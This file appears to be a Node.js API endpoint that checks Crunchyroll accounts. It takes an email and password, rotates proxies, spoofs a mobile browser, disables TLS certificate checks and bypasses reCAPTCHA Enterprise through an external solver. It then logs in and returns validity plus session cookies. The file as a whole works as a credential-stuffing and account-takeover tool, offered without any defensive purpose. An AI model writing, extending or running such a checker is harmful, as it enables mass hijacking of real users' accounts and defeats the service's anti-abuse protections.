const axios = require('axios');
const https = require('https');
const { getProxyManager } = require('../utils/proxy-manager');
const { solveRecaptchaV3 } = require('../utils/recaptcha-solver');

const USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36';

const RECAPTCHA_CONFIG = {
    sitekey: '6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk',
    anchorUrl: 'https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk&co=aHR0cHM6Ly9zc28uY3J1bmNoeXJvbGwuY29tOjQ0Mw..&hl=es&v=U5VsmTDhJM1iOJUyw4DEUTYv&theme=dark&size=invisible&badge=bottomright&anchor-ms=20000&execute-ms=30000&cb=6wj1o751j03f',
    version: 'enterprise',
    action: 'login',
    hl: 'es'
};

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

async function createClient(proxyUrl = null) {
    const config = {
        baseURL: 'https://sso.crunchyroll.com',
        headers: {
            'User-Agent': USER_AGENT,
            'Accept': 'application/json, text/plain, ',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Origin': 'https://sso.crunchyroll.com',
            'Referer': 'https://sso.crunchyroll.com/es/login',
        },
        withCredentials: true,
        httpsAgent: new https.Agent({
            rejectUnauthorized: false,
            keepAlive: true
        }),
        timeout: 30000
    };
    if (proxyUrl) {
        const proxyConfig = parseProxyUrl(proxyUrl);
        if (proxyConfig) {
            config.proxy = proxyConfig;
        }
    }

    return axios.create(config);
}

function parseProxyUrl(proxyUrl) {
    try {
        let url = proxyUrl;
        if (!proxyUrl.startsWith('http')) {
            url = `http://${proxyUrl}`;
        }
        
        const parsed = new URL(url);
        const proxyConfig = {
            host: parsed.hostname,
            port: parseInt(parsed.port) || (parsed.protocol === 'https:' ? 443 : 80),
            protocol: parsed.protocol.replace(':', '')
        };
        
        if (parsed.username && parsed.password) {
            proxyConfig.auth = {
                username: parsed.username,
                password: parsed.password
            };
        }
        
        return proxyConfig;
    } catch (error) {
        return null;
    }
}

async function initializeCookieConsent(client) {
    try {
        const configUrl = 'https://cdn.cookielaw.org/consent/01917a69-cf73-76ca-926a-c59007044266/01917a69-cf73-76ca-926a-c59007044266.json';
        await client.get(configUrl);
        const geoUrl = 'https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location';
        await client.get(geoUrl);
        const templateUrl = 'https://cdn.cookielaw.org/consent/01917a69-cf73-76ca-926a-c59007044266/019cb492-6dfe-7904-9c44-8d1a8b11755f/en.json';
        await client.get(templateUrl);
        await delay(1000);
        return true;
    } catch (error) {
        return false;
    }
}

async function loadLoginPage(client) {
    try {
        const returnUrl = encodeURIComponent('/authorize?client_id=kmj7imhjt_q90lcbzzsj&redirect_uri=https%3A%2F%2Fwww.crunchyroll.com%2Fpremium%2Fredirects&response_type=cookie&state=active_promo%3Dfalse');
        const loginPageUrl = `/es/login?return_url=${returnUrl}`;
        const rscHeaders = {
            'RSC': '1',
            'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22es%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D',
            'Next-Router-Prefetch': '1',
            'Next-Url': '/es/login'
        };
        
        await client.get(loginPageUrl, { headers: rscHeaders });
        const registerUrl = `/es/register?return_url=${returnUrl}`;
        await client.get(registerUrl, { headers: rscHeaders });
        
        await delay(1500);
        return true;
    } catch (error) {
        return false;
    }
}

async function getRecaptchaToken() {
    try {
        const token = await solveRecaptchaV3({
            anchorUrl: RECAPTCHA_CONFIG.anchorUrl,
            sitekey: RECAPTCHA_CONFIG.sitekey,
            url: 'https://sso.crunchyroll.com/es/login',
            action: RECAPTCHA_CONFIG.action,
            hl: RECAPTCHA_CONFIG.hl
        });
        
        if (token && token.length > 50) {
            return token;
        }
        return null;
    } catch (error) {
        return null;
    }
}

async function performLogin(client, email, password, recaptchaToken) {
    const loginPayload = {
        email: email,
        password: password,
        recaptchaToken: recaptchaToken,
        eventSettings: {}
    };

    const loginHeaders = {
        'Content-Type': 'application/json',
        'Origin': 'https://sso.crunchyroll.com',
        'Referer': 'https://sso.crunchyroll.com/es/login',
        'Accept': 'application/json'
    };

    try {
        const response = await client.post('/api/login', loginPayload, {
            headers: loginHeaders,
            timeout: 30000
        });
        
        if (response.data && response.data.status === 'ok') {
            return { 
                success: true, 
                data: response.data, 
                cookies: response.headers['set-cookie'] 
            };
        } else {
            return { 
                success: false, 
                error: '🚩 Credenciales incorrectas o cuenta bloqueada', 
                data: response.data 
            };
        }
    } catch (error) {
        if (error.response) {
            return { 
                success: false, 
                error: `HTTP ${error.response.status}`, 
                data: error.response.data 
            };
        } else if (error.code === 'ECONNABORTED') {
            return { success: false, error: 'Timeout' };
        } else {
            return { success: false, error: error.message };
        }
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { email, pass, useProxy, rotateProxy } = req.method === 'GET' ? req.query : req.body;
    
    if (!email || !pass) {
        return res.status(400).json({ 
            error: 'Faltan parámetros requeridos',
            usage: '/api/crunchyroll-login?email=correo@ejemplo.com&pass=contraseña&useProxy=true&rotateProxy=true'
        });
    }
    
    try {
        let proxyUrl = null;
        let attempts = 1;
        const maxAttempts = rotateProxy === 'true' ? 3 : 1;
        let lastError = null;
        const proxyManager = getProxyManager();
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            if (useProxy === 'true') {
                proxyUrl = proxyManager.getNextProxy();
                if (!proxyUrl) {
                }
            }
            
            const client = await createClient(proxyUrl);
           
            const consentOk = await initializeCookieConsent(client);
            if (!consentOk) {
                if (useProxy === 'true') {
                    proxyManager.markProxyFailed(proxyUrl);
                    continue;
                }
                break;
            }
            
            const pageLoaded = await loadLoginPage(client);
            if (!pageLoaded) {
                if (useProxy === 'true') {
                    proxyManager.markProxyFailed(proxyUrl);
                    continue;
                }
                break;
            }
            
            const recaptchaToken = await getRecaptchaToken();
            if (!recaptchaToken) {
                if (useProxy === 'true') {
                    proxyManager.markProxyFailed(proxyUrl);
                    continue;
                }
                break;
            }
            
            await delay(2000);
            const result = await performLogin(client, email, pass, recaptchaToken);
            
            if (result.success) {
                return res.status(200).json({
                    success: true,
                    message: '✅',
                    email: email,
                    data: result.data,
                    cookies: result.cookies,
                    proxyUsed: proxyUrl,
                    attempt: attempt
                });
            } else {
                lastError = result.error;
                if (useProxy === 'true' && (result.error === 'Timeout' || result.error.includes('ECONNREFUSED'))) {
                    proxyManager.markProxyFailed(proxyUrl);
                    continue;
                } else {
                    break;
                }
            }
        }
        
        return res.status(401).json({
            success: false,
            error: '🚫',
            email: email,
            attempts: attempts
        });
        
    } catch (error) {
        return res.status(500).json({
            success: false,
            error: '🚫',
            message: error.message
        });
    }
};
